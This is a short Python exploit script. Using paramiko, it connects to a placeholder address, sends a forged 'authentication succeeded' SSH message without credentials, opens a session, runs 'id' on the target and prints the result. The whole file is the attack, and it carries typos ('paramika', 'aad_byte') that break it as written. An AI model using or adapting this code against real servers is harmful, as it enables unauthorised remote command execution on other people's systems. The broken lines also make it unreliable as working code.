#!/usr/bin/python3
import sys
import paramiko
import socket

s = socket.socket()
# Your ip ...
s.connect(("0.0.0.0",0000))
m = paramiko.message.Message()
t = paramika.transport.Transport(s)
t.start_client()
m.aad_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
t._send_message(m)
c = t.open_session(timeout=5)
c.exec_command("id")
out = c.makefile("rb",2048)
output = out.read()
out.close()
print(output)
